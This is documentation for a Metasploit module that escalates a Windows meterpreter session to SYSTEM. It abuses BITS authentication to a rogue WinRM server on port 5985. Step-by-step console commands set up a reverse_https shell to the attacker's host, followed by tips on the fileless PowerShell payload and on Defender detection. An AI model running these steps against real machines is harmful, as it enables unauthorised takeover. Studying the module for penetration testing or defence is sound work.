## Vulnerable Application

All windows platforms except Windows servers.

More precisely, **the availability of port 5985 is a necessary and sufficient condition**.

This module exploits BITS behavior which tries to authenticate on local WinRM server (port 5985) even if this service is not running.
As this module runs a fake service on WinRM port to steal a SYSTEM token, this port must be available.
However, WinRM service is natively running on windows servers preventing to run this exploit successfully.

Nevertheless, if WinRM service is disabled by an admin, or just killed, the operating system becomes vulnerable.

## Verification Steps

1. get a meterpreter session which has either SE_IMPERSONATE_NAME or SE_ASSIGNPRIMARYTOKEN_NAME privilege.
1. Do: `use exploits/windows/local/bits_ntlm_token_impersonation`
1. Do: `set SESSION <previous meterpreter session>`
1. Do: `set PAYLOAD windows/meterpreter/reverse_https`
1. Do: `set LHOST <your ip>`
1. Do: `set LPORT <your port>`
1. Do: `exploit`
1. A new meterpreter session should pop.

## Options

SESSION &#8594; index of the previous meterpreter session in through of which the exploit will be run.

## Scenarios

Will be added later
    
## Description

This module exploits BITS behavior which tries to connect to the local Windows Remote Management server (WinRM) every times it starts.
The exploit dll (loaded through a previous unprivilegied meterpreter session) launches a fake WinRM server which listens
on port 5985 and triggers BITS.
When BITS starts, it tries to authenticate to the Rogue WinRM server, which allows to steal a SYSTEM token.
This token is then used to launch a new process as SYSTEM user.
In the case of this exploit, powershell.exe is launched as SYSTEM and it downloads/executes an evil powershell script on
a second local http server.
Thus, this exploit doesn't write any file on the disk.

this exploit has been written from decoder's proof of concept:
https://decoder.cloud/2019/12/06/we-thought-they-were-potatoes-but-they-were-beans/
https://github.com/antonioCoco/RogueWinRM

This exploit has been successfully tested on :
- Windows 10 (10.0 Build 19041) 32 bits

## Warnings

- **SE_IMPERSONATE_NAME or SE_ASSIGNPRIMARYTOKEN_NAME privs are required.**
- **BITS must not be already running.**
- As this dll exploit runs 2 services on the target (Fake WinRM on port 5985 and HTTP on port 80),
a firewall popup may appear on target screen. Thus, this exploit is not completely silent.
- A powershell windows flashes on target screen
- Windows servers are not vulnerable because a genuine WinRM service is already running.
- Powershell payload may be flagged by Windows defender. You can customize powershell payload with "show advanced"
